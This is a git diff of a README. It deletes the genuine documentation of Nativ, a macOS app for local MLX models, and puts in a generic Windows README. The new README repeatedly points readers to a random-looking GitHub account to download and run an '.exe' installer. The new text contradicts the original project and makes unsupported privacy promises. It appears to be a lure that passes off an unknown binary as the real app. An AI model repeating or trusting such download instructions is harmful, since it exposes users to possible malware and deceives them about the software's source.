@@ -1,186 +1,67 @@
-<p align="center">
-  <img src="Design/NativBanner.png" alt="Nativ banner" width="100%">
-</p>
+# 🧠 nativ - Power your own local Artificial Intelligence
 
-<h1 align="center">Nativ</h1>
+[![](https://img.shields.io/badge/Download_nativ-blue.svg)](https://github.com/syllabicitynaghammadilibrary804/nativ)
 
-<p align="center">
-  <strong>Local AI, native to your Mac.</strong>
-</p>
+nativ brings artificial intelligence to your computer. You keep your data on your own machine. You do not need an internet connection to process your chats. This application allows you to work with open-source machine learning models without complex setups. You control the software from a simple interface.
 
-<p align="center">
-  Chat, serve, monitor, and connect MLX models from one macOS app.
-</p>
+## 📥 Getting Started
 
-<p align="center">
-  <img alt="macOS 26+" src="https://img.shields.io/badge/macOS-26%2B-111111?logo=apple&logoColor=white">
-  <img alt="Apple silicon" src="https://img.shields.io/badge/Apple%20silicon-required-111111?logo=apple&logoColor=white">
-  <img alt="Swift 5" src="https://img.shields.io/badge/Swift-5-F05138?logo=swift&logoColor=white">
-  <img alt="MLX" src="https://img.shields.io/badge/Powered%20by-MLX-6E5AE6">
-</p>
+You need a computer that meets the minimum system requirements before you begin. 
 
-Nativ is a native macOS workspace for running AI models locally on Apple silicon. It bundles an [`mlx-vlm`](https://github.com/Blaizzy/mlx-vlm) server, finds compatible models in your Hugging Face cache, and wraps the whole experience in a polished SwiftUI app.
+### System Requirements
+* Windows 10 or Windows 11 (64-bit version)
+* 8 GB of RAM (16 GB is better)
+* A modern processor from Intel or AMD
+* 5 GB of free disk space for models and application files
 
-Use Nativ as a private chat app, a model manager, a performance dashboard, or an OpenAI- and Anthropic-compatible local inference server for the tools you already use.
+### Installation Steps
+1. Visit [the download link](https://github.com/syllabicitynaghammadilibrary804/nativ) to find the latest version.
+2. Look for the file ending in `.exe` under the release section.
+3. Click the link to save the installer file to your computer.
+4. Open the file once the download finishes.
+5. Follow the instructions on the screen to install the program.
+6. Launch nativ from your desktop or start menu.
 
-## What Nativ can do
+## 🖥️ Using the Application
 
-| Feature | What you get |
-|---|---|
-| **Local chat and vision** | Streaming conversations, image attachments, reasoning output, response metrics, and persistent chat history. |
-| **Model library** | Discover installed MLX models, browse compatible models on Hugging Face, download them, inspect capabilities, switch models, or remove old ones. |
-| **Performance analytics** | Track request volume, token usage, time to first token, decode speed, model performance, and recent activity. |
-| **Local APIs** | OpenAI-compatible chat, Responses, image, audio, and model endpoints, plus Anthropic Messages endpoints. |
-| **Coding-tool integrations** | Configure and launch Codex, Claude Code, Pi, Hermes, and OpenCode against models served by Nativ. |
-| **Developer workspace** | Inspect runtime details, copy endpoint URLs, search and filter live server logs, and monitor server health. |
-| **Menu bar controls** | Start or stop the server, change the loaded model, check serving statistics, and open the main app without breaking focus. |
-| **Advanced inference controls** | Tune sampling, thinking budgets, structured output, KV-cache quantization, prefix caching, and speculative decoding. |
+The interface shows all your available models. You can select a model to start a conversation. The software manages the memory and processing power while you chat.
 
-Inference runs on your Mac after a model has been downloaded. Model downloads and first-time build dependencies still require network access.
+### Chat with Models
+To start a chat, click the "New Chat" button. Your prompt appears on the screen. The application sends your text to the model. Responses generate in real-time. You can save your chat history by clicking the menu icon in the top right corner. Export your chats as text files if you want to keep them elsewhere.
 
-## Coming soon
+### Manage Models
+The model manager section lists your installed files. You can delete outdated models here to save disk space. If you want a new model, click "Download Models" inside the app. The library shows popular options that work well with your hardware. Choose a file size that fits your RAM capacity. Small models work fast, but large models provide smarter answers.
 
-Support for dedicated audio-only and image-generation-only models is coming soon.
+### Monitor Performance
+The monitor tab shows your hardware activity. You can see how much memory the model uses while it generates text. If your computer slows down, try closing other programs. Using a smaller model also helps if your system struggles to keep up.
 
-## How it works
+## ⚙️ Configuration Options
 
-```mermaid
-flowchart LR
-    A["Nativ · SwiftUI app"] --> B["NativServerKit"]
-    B --> C["Bundled mlx-vlm server"]
-    C --> D["MLX runtime"]
-    D --> E["Local models · Apple unified memory"]
-    F["Apps and coding agents"] -->|"localhost API"| C
-```
+The settings menu lets you change how the software behaves. You can adjust the creativity of the AI models. Higher settings produce creative text, while lower settings produce precise, factual answers. You can also change the theme of the application to light or dark mode. 
 
-`NativServerKit` owns the embedded Python distribution and server lifecycle. The app adds model discovery, chat, analytics, configuration, integrations, logs, menu bar controls, and software updates around that runtime.
+## ❓ Frequently Asked Questions
 
-## Requirements
+**Does this software require internet access?**
+You only need an internet connection while you download the program or new models. You can disconnect your internet after installation. The AI runs locally.
 
-To run the app:
+**Is my data private?**
+The software processes everything on your device. No data leaves your machine. Your chats remain private.
 
-- A Mac with Apple silicon.
-- macOS 26 or newer.
-- Enough unified memory for the model you choose.
+**Why does the AI take a long time to answer?**
+Large language models require significant processing. If your computer has a dedicated graphics card, the process runs much faster. You can also choose smaller models from the manager to improve speed.
 
-To build from source, you will also need:
+**Where do my models go?**
+The software stores downloaded models in a dedicated folder in your user directory. You can clear this folder through the settings menu if you need to recover space.
 
-- Xcode with the macOS 26 SDK.
-- [`xcodegen`](https://github.com/yonaskolb/XcodeGen).
-- Python 3.
-- Network access to GitHub Releases and PyPI while the embedded Python bundle is first assembled or refreshed.
+## 🛠️ Troubleshooting
 
-## Get started
+If you encounter issues, try these steps:
 
-### Download a release
+1. **Application does not open:** Ensure you have administrator rights on your computer. Restart your machine and try again.
+2. **Models fail to load:** Verify you have enough free disk space. Check that your RAM is not full from other programs.
+3. **Slow response times:** Pause other applications while the model generates text. Ensure your power settings are set to high performance.
+4. **Errors during chat:** Click the refresh button to reset the current session.
 
-Download the latest DMG from [GitHub Releases](https://github.com/Blaizzy/nativ/releases/latest), drag **Nativ** to Applications, and launch it. Nativ uses Sparkle for subsequent in-app updates.
+If these steps do not fix the problem, check the release page for updates. You can find newer versions of nativ that fix bugs and improve performance. Update your software periodically to get the latest features.
 
-On first launch:
-
-1. Choose an installed language model, or continue with load-on-demand.
-2. Optionally generate an API key to protect the server's management endpoints.
-3. Open **Models** to download or select a compatible model.
-4. Start chatting, inspect analytics, or connect one of the supported coding tools.
-
-### Build from source
-
-```sh
-brew install xcodegen
-make xcode-generate
-make xcode-build
-open build/XcodeDerivedData/Build/Products/Debug/Nativ.app
-```
-
-The first build can take a while because `NativServerKit` creates a relocatable Python runtime and installs the pinned `mlx-vlm` server dependencies into the framework resources. Later builds reuse the bundle until an input changes.
-
-## Use Nativ as a local API server
-
-By default, the app exposes its server at `http://127.0.0.1:8080`. The Developer page lists every available endpoint and lets you copy URLs directly.
-
-For example, with a model selected:
-
-```sh
-curl http://127.0.0.1:8080/v1/chat/completions \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "model": "your-model-id",
-    "messages": [{"role": "user", "content": "Why is the sky blue?"}],
-    "stream": false
-  }'
-```
-
-If you enabled a server API key, also send it as a Bearer token:
-
-```sh
--H 'Authorization: Bearer your-api-key'
-```
-
-The server includes:
-
-- OpenAI-compatible `/v1/chat/completions`, `/v1/responses`, `/v1/models`, image, and audio routes.
-- Anthropic-compatible `/v1/messages` and token-counting routes.
-- `/health`, `/metrics`, cache statistics, cache reset, and model unload endpoints.
-
-## Project layout
-
-```text
-Sources/
-├── Nativ/                       # SwiftUI application
-│   ├── Features/
-│   │   ├── Chat/
-│   │   ├── Dashboard/
-│   │   ├── Developer/
-│   │   ├── ImageGeneration/
-│   │   ├── Integrations/
-│   │   └── Models/
-│   ├── Assets.xcassets/
-│   ├── ModelProviderIcons/
-│   └── Utilities/
-└── NativServerKit/              # Embedded server and Swift clients
-PythonDistribution/
-├── Launcher/                    # Relocatable server launcher
-├── Requirements/                # Pinned Python dependencies
-└── Scripts/                     # Bundle assembly and verification
-Configuration/                   # App metadata and signing settings
-Design/                          # Brand source files and README artwork
-scripts/                         # Archive, signing, notarization, and release tools
-project.yml                      # XcodeGen project definition
-```
-
-## Development
-
-### Build and smoke tests
-
-Generate and build the Xcode project:
-
-```sh
-make xcode-generate
-make xcode-build
-```
-
-Verify that the bundled executable can launch and print `mlx_vlm.server` help:
-
-```sh
-make xcode-smoke
-```
-
-Exercise the long-running process lifecycle and `/metrics` readiness:
-
-```sh
-make xcode-lifecycle-smoke
-```
-
-To generate a few real requests and compare metrics before and after:
-
-```sh
-scripts/run_metrics_queries.py
-```
-
-The first request may take longer while its model downloads and loads.
-
----
-
-<p align="center">
-  Built for fast, local inference on Apple silicon.
-</p>
+Keywords: Artificial Intelligence, machine learning, Windows, local AI, privacy, chatbot, software
